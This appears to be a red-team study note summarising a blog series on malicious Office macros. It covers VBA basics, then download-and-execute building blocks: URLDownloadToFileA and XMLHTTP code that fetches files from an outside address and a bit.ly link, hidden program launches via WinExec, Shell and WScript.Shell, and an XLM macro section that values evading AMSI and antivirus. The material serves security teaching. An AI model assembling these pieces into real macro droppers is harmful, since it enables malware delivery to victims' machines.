# Malicious Macros

## Intro to Macros and VBA

- VBA really allows a programmer to perform nearly any operation by a user.

## VBA Language for Script Kiddies

- VBA applications have access to a wide variety of system-level objects as well as the application and document objects. You can even reference external libraries, including DLLs, TLBs, OCXs

- VBA is compiled into an intermediate language, P-code, which is run by these scripting engines.

- An Office document contains both the original, plaintext source code (for reading/editing) and the intermediate, machine-readable P-code (for execution). 

## Developing with VBA

- Array(arglist)
	- This constructor allows you to create and initialize an array. 

- Join(sourcyarray, [delimiter])
	- This function merges the items in a collection to return a string.

- Split(expression, [ delimiter, [ limit, [ compare ]]])
	- This function splits a string expression into an array of substrings based on a delimiter, limit, and comparison.

- ChDir path, ChDrive drive
	- These functions are used to navigate the filesystem and change the current directory or drive to the specified value.

- CurDir
	- This function returns a Variant String representing the current path.

- Dir [ (pattern, [ attributes ] ) ]
	- This returns a String that represents the name of a file or directory matching the specified pattern.

- MkDir path, RmDir path
	- These functions will create or delete a directory.

- Open pathname For mode As #filenumber
	- This function will open a file for input and output operations.

- Close [ filenumberlist ]
	- This function closes the specified files that were opened using the Open function.

- Write #filenumber, output
	- This is used to write data to a file as specified by the file number.

- Input #filenumber, varlist
	- This is used to read data from an opened file and assigns the data to variables.

- FileCopy source, destination
	- This function copies a file from source to destination. It will error if you try to copy a file that is currently open.

- AppActivate title
	- This function will activate an application window.

- Shell(pathname, [ windowstyle ])
	- This function will run an executable program. 

- CallByName (object, procname, calltype, [args()] )
	- This will execute a method of an object dynamically at runtime by using the function’s name.

- Environ( { envstring | number } )
	- This function will return a string associated with the operating system environment variable.

- InputBox(prompt, [ title ], [ default ], [ xpos ], [ ypos ], [ helpfile, context ])
	- This function displays an input dialog box to the user and returns a String containing the contents of the text box.

- MsgBox (prompt, [ buttons, ] [ title, ] [ helpfile, context ])
	- This function displays a message dialog box to the user and waits for the user to press a button. 

- File
	- The file object represents a file on disk and its properties contain information about that file.
	- Some of the key properties include: Attributes, DateCreated, DateLastAccessed, DateLastModified, Drive, Name, ParentFolder, Path, ShortName, ShortPath, Size, and Type. In addition to these properties, the File object has a few key methods: Copy, Delete, Move, and OpenAsTextStream.

- FileSystemObject
	- The FileSystemObject provides access to the computer’s filesystem.
	- It contains properties, including Drives, Name, Path, Size, and Type. It also has numerous methods, including CopyFile, CopyFolder, CreateFolder, CreateTextFile, DeleteFile, DeleteFolder, FileExists, FolderExists, GetAbsolutePathName, GetFileName, MoveFile, and WriteLine.

```
Dim A As Varaint
A = Array(1, 2, 3)
```

```
myCSV = Join(A, “,”)
```

```
B = Split(myCSV, “,”)
```

```
Dim myListing As String
myListing = Dir “” ‘ Returns the first listing in the directory
Do
      MsgBox myListing
Loop While myListing <> “”
```

```
Dim MyString, MyNumber
Open "TESTFILE" For Input As #1     ‘ Open file for input
Do While Not EOF(1)                 ‘ Loop until end of file
    Input #1, MyString, MyNumber    ‘ Read data into two variables
    Debug.Print MyString, MyNumber  ‘ Print to the Immediate window
Loop
Close #1                            ‘ Close file.
```

```
Dim myFileNumber
myFileNumber = FreeFile
Open “Test.txt” For Output As #myFileNumber
Write #myFileNumber, “Test output”
Close #myFileNumber
```

```
Dim RetVal
RetVal = Shell("C:\WINDOWS\CALC.EXE", 0)  ' Start a hidden Calculator
```

```
Sub CreateAfile
    Set fs = CreateObject("Scripting.FileSystemObject")
    Set test = fs.CreateTextFile("c:\testfile.txt", True)
    test.WriteLine("This is a test.")
    test.Close
End Sub
```

## Malicious Macros

-  We can make use of VBA code, COM objects, OLE automation, and Win32 APIs to explore the host, access the filesystem, and run commands.

```
Declare PtrSafe Function GetPID _
    Lib "kernel32" _
    Alias “GetProcessId” ( _
        ByVal hProcess As LongPtr _
    ) _
    As Long
```

- Urlmon exposes the easy-to-use function: UrlDownloadToFileA.

```
Declare PtrSafe Function URLDownloadToFileA Lib "urlmon" ( _
    ByVal pCaller As LongPtr, _
    ByVal szURL As String, _
    ByVal szFileName As String, _
    ByVal dwReserved As Long, _
    ByVal lpfnCB As LongPtr _
) As Long

Sub DownloadFile()
     URLDownloadToFileA 0, "https://192.168.10.10/Hello.txt", "Hello.txt", 0, 0
End Sub
```

- COM object: XMLHTTP. XMLHTTP is part of Microsoft’s suite of XML DOM components. The ADODB stream object is used to represent a stream of data or text.

```
Sub DownloadFile()
    Set objXMLHTTP = CreateObject("Microsoft.XMLHTTP")
    Set objADODBStream = CreateObject("ADODB.Stream")
    objXMLHTTP.Open "GET", "https://bit.ly/2B1GCyQ", False
    objXMLHTTP.Send
    objADODBStream.Type = 1
    objADODBStream.Open
    objADODBStream.Write objXMLHTTP.responseBody
    objADODBStream.savetofile "ts.jpg", 2
End Sub
```
- Win32 API calls to run a program. Probably the simplest function for starting a program is WinExec.

```
Declare Function WinExec Lib "kernel32" ( _
     ByVal lpCmdLine As String, _
     ByVal nCmdShow As Long _
) As Long

Const SHOW_HIDE As Long = 0

Sub ExecuteFile ()
     WinExec "C:\Windows\System32\notepad.exe", SHOW_HIDE
End Sub
```

- Execute a program using the Shell command built into VBA itself.

```
Sub ExecuteFile ()
    Shell "C:\Windows\System32\notepad.exe", vbHide
End Sub
```

- Windows Script provides a Wscript.Shell object, which in turn provides a Run method. 

```
Sub ExecuteFile ()
    Set objWscriptShell = CreateObject(“WScript.Shell”)
    objWscriptShell.Run “C:\Windows\System32\notepad.exe", 0
End Sub
```

## Macro 4.0 (XLM Macros)

- No. This is not VBA.
- No. This is not XML.
- XLM (Excel 4.0) Macros were created in 1992, before VBA existed.

- Background
	- [(Old School: Evil Excel 4.0 Macros)[https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/]
	- [(Excel4-DCOM)[https://github.com/outflanknl/Excel4-DCOM]
	- [(Process Injection with SYLK)[https://outflank.nl/blog/2019/10/30/abusing-the-sylk-file-format/]
	- [(SharpShooter)[https://github.com/mdsecactivebreach/SharpShooter]
	- [(Cybereason 64-Bit Shellcode Execution via Excel 4.0)[https://www.cybereason.com/blog/excel4.0-macros-now-with-twice-the-bits]
	- [(Macrome)[https://github.com/michaelweber/Macrome]
	- [(EXCELntDonut)[https://github.com/FortyNorthSecurity/EXCELntDonut]

- Why is this so great?
	- AMSI has no vibility into XML macros.
	- A/V still not great at detecting malicious XLM macros.
	- Payloads can be delivered in .xls files.
	- Process injection is possible.
	
- Examples
	- [Living of the land](https://inquest.net/blog/2019/01/29/Carving-Sneaky-XLM-Files)
	- [XLM Macros 101](https://hatching.io/blog/excel-xlm-extraction/)

## Very Hidden Sheets

## VBA Stomping

## VBA Purging

## Code Signing Tampering


## Links & Resources

- [Intro to Macros](https://www.trustedsec.com/blog/intro-to-macros-and-vba-for-script-kiddies/)
- [VBA Language](https://www.trustedsec.com/blog/the-vba-language-for-script-kiddies/)
- [Developing VBA](https://www.trustedsec.com/blog/developing-with-vba-for-script-kiddies/)
- [Malicious Macros](https://www.trustedsec.com/blog/malicious-macros-for-script-kiddies/)


#### Disclaimer
*The content within this repository is for educational purposes only. It is designed to help users test their own system against information security threats and protect their IT infrastructure from similar attacks.*
